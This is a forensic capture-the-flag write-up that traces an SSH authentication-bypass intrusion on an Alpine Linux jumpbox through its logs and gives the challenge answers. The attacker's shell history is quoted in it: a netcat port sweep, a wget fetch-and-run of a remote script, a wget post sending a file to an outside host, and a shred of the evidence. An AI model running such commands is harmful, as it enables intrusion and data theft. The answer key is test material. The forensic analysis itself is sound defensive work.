---
title: "SSHole - HTB Sherlock Write-up"
date: 2026-11-17
tags: ["HTB", "Sherlock", "DFIR"]
draft: false
---


## Task 1: What Linux distribution name and version was the targeted server running?

The evidence is a mini Linux file system:

```bash
ls
etc  home  root  var
```

We can check which distro it is from the release files:

```bash
ls etc/*release
etc/alpine-release  etc/os-release

cat etc/os-release
NAME="Alpine Linux"
ID=alpine
VERSION_ID=3.24.3
PRETTY_NAME="Alpine Linux v3.24"
HOME_URL="https://alpinelinux.org/"
BUG_REPORT_URL="https://gitlab.alpinelinux.org/alpine/aports/-/issues"
```

**Answer:** `Alpine Linux 3.24.3`

---

## Task 2: What is the CVE ID of the vulnerability abused by the attacker to gain access?

Searching online for an SSH vulnerability affecting Alpine Linux led to this article:
https://cycode.com/blog/sshole-cve-2026-123158-openssh-alpine-linux-vulnerability/

**Answer:** `CVE-2026-123158`

---

## Task 3: When did the attacker exploit the vulnerability?

Checking the available logs:

```bash
ls var/log/
acpid.log  apk.log  dmesg  messages  wtmp
```

`wtmp` is empty, so we look at `messages` for successful SSH logins:

```bash
cat var/log/messages | grep sshd-session | grep -i accepted
Nov  6 06:43:05 dev-jumpbox auth.info sshd-session[4617]: Accepted password for root from 192.168.72.131 port 53492 ssh2
Nov  6 11:27:08 dev-jumpbox auth.info sshd-session[4852]: Accepted password for adminsvc from 192.168.72.1 port 61351 ssh2
Nov  6 12:03:29 dev-jumpbox auth.info sshd-session[5407]: Accepted password for root from 192.168.72.131 port 43238 ssh2
Nov  6 12:25:43 dev-jumpbox auth.info sshd-session[5425]: Accepted password for root from 192.168.72.131 port 47692 ssh2
Nov  6 12:25:48 dev-jumpbox auth.err internal-sftp[5428]: error: process_write: write "/root/alpine/root/.cache/vmware/Nov  6 12:27:45 dev-jumpbox auth.info sshd-session[5432]: Accepted password for root from 192.168.72.131 port 44638 ssh2"
Nov  6 12:28:06 dev-jumpbox auth.info sshd-session[5436]: Accepted password for root from 192.168.72.131 port 44468 ssh2
Nov  6 12:28:18 dev-jumpbox auth.info sshd-session[5440]: Accepted password for root from 192.168.72.131 port 36718 ssh2
Nov  6 12:28:40 dev-jumpbox auth.info sshd-session[5444]: Accepted password for root from 192.168.72.131 port 47002 ssh2
```

Every login is `root` from `192.168.72.131`, except one login for `adminsvc` from `192.168.72.1`. Looking at all the `adminsvc` entries:

```bash
grep -n "adminsvc" var/log/messages
66:Nov  6 11:27:05 dev-jumpbox auth.info sshd-session[4852]: Failed password for adminsvc from 192.168.72.1 port 61351 ssh2
67:Nov  6 11:27:08 dev-jumpbox auth.info sshd-session[4852]: Accepted password for adminsvc from 192.168.72.1 port 61351 ssh2
77:Nov  6 12:20:02 dev-jumpbox auth.info sshd-session[4854]: Disconnected from user adminsvc 192.168.72.1 port 61351
```

A failed password followed by an accepted password on the same connection (same port 61351) is the pattern of this vulnerability.

**Answer:** `2026-11-06 11:27:08`

---

## Task 4: Which user account was abused by the attacker?

From the logs above, the account used in the exploit was `adminsvc`.

**Answer:** `adminsvc`

---

## Task 5: What string value causes the authentication bypass?

Per the vulnerability write-up, the bypass abuses accounts whose password field in `/etc/shadow` is `*`.

**Answer:** `*`

---

## Task 6: What command did the attacker use to scan the network reachable via the jumpbox, allowing them to target internal developer systems?

The attacker's shell history is in the `adminsvc` home directory:

```bash
ls -a home/adminsvc/
.  ..  .ash_history  scanreport.txt  .ssh

cat home/adminsvc/.ash_history
ls -la
for ip in {1..254}; do nc -zvw 1 192.168.18.$ip 1-65535 2>&1 | grep -E "succeeded|open"; done
vi scanreport.txt
cat scanreport.txt
bash <(wget -qO- https://raw.githubusercontent.com/papinyurii33/devscripts/refs/heads/main/setup.sh)
ls -la /tmp
ls -l /tmp/.devenv
wget --post-file=/tmp/.devenv -O- https://devv.coding.eu/process
shred -u /tmp/.devenv
exit
```

**Answer:** `for ip in {1..254}; do nc -zvw 1 192.168.18.$ip 1-65535 2>&1 | grep -E "succeeded|open"; done`

---

## Task 7: What was the exfiltration URI where the attacker exfiltrated a sensitive file?

From the same history, the attacker posted `/tmp/.devenv` to a remote server, then deleted it with `shred`:

```bash
wget --post-file=/tmp/.devenv -O- https://devv.coding.eu/process
shred -u /tmp/.devenv
```

**Answer:** `https://devv.coding.eu/process`

---

## Answers

| Task | Answer                                                                                            |
| ---- | ------------------------------------------------------------------------------------------------- |
| 1    | Alpine Linux 3.24.3                                                                               |
| 2    | CVE-2026-123158                                                                                   |
| 3    | 2026-11-06 11:27:08                                                                               |
| 4    | adminsvc                                                                                          |
| 5    | `*`                                                                                               |
| 6    | `for ip in {1..254}; do nc -zvw 1 192.168.18.$ip 1-65535 2>&1 \| grep -E "succeeded\|open"; done` |
| 7    | https://devv.coding.eu/process                                                                    |